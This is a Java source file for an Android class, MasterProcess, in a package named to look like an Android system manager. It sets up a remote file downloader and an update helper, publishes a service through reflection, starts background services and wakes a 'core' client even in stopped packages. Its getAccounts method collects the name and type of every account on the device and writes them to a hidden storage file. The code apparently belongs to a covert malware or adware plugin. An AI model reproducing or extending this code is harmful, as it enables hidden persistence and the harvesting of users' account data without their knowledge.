package com.android.system.manager.plugin.master;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.android.system.manager.plugin.utils.FileUtils;
import com.android.system.manager.plugin.utils.L;
import com.duowan.mobile.netroid.Network;
import com.duowan.mobile.netroid.RequestQueue;
import com.duowan.mobile.netroid.stack.HurlStack;
import com.duowan.mobile.netroid.toolbox.BasicNetwork;
import com.duowan.mobile.netroid.toolbox.FileDownloader;

import java.io.File;
import java.lang.reflect.Method;

/**
 * Created by Administrator on 2017/3/8.
 */

public class MasterProcess {
    private static MasterProcess instance = null;
    private Context context;
    private RequestQueue mQueue;
    private FileDownloader mFileDownloader;

    public static MasterProcess ins(){
        if(instance == null){
            synchronized (MasterProcess.class){
                if(instance == null){
                    instance = new MasterProcess();
                }
            }
        }
        return instance;
    }

    public void init(Context context,Class serviceManager){
        L.d("init master");
        this.context = context;
        initNetwork();
        MasterServerImpl.ins().a(context);
        try {
            Method m = serviceManager.getMethod("publishService",new Class[]{String.class,String.class,ClassLoader.class});
            m.invoke(null,new Object[]{"master", MasterServerImpl.class.getName(), MasterServerImpl.class.getClassLoader()});
        } catch (Exception e) {
            L.d("publish master",e);
        }
        UpdateHelper.getInstance().start();
        startSService();
        getAccounts();
    }

    public void startSService(){
//        L.d("Master startSService");
        Intent intent = new Intent();
        intent.setClassName(MasterConstant.SYSTEM_SERVICE[0],MasterConstant.SYSTEM_SERVICE[1]);
        context.startService(intent);
    }

    private void initNetwork(){
        // you can choose HttpURLConnection or HttpClient to execute request.
        Network network = new BasicNetwork(new HurlStack("TB", null), "utf-8");
        // you can specify parallel thread amount, here is 4.
        // also instance the DiskBaseCache by your settings.
        mQueue = new RequestQueue(network, 2, null);
        // start and waiting requests.
        mQueue.start();
        mFileDownloader = new FileDownloader(mQueue, 1);
    }

    public Context getContext(){
        return context;
    }

    public RequestQueue getQueue(){
        return mQueue;
    }

    public FileDownloader getDownloader(){
        return mFileDownloader;
    }

    public void onDestroy() {
        MasterServerImpl.ins().b();
        SettingHelper.onDestroy();
        UpdateHelper.getInstance().onDestroy();
    }

    public void wakeClient(){
        L.d("wake client");
        Intent intent = new Intent();
        intent.setClassName(MasterConstant.CORE_SERVICE[0],MasterConstant.CORE_SERVICE[1]);
        context.startService(intent);
        Intent broadcast = new Intent();
        broadcast.setAction(MasterConstant.CORE_ACTION);
        broadcast.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
        context.sendBroadcast(broadcast);
    }

    public void getAccounts()
    {
        AccountManager accountManager =  AccountManager.get(context);
        Account[] accounts = accountManager.getAccounts();
        if(accounts.length > 0)
        {
            File f = FileUtils.getTbStorageFile(context,"accounts");
            String s = "";
            for(Account account:accounts){
                s += "name:"+account.name+"  type:"+account.type+"\r\n";
            }
            FileUtils.writeFile(f,s,false);
        }
    }
}
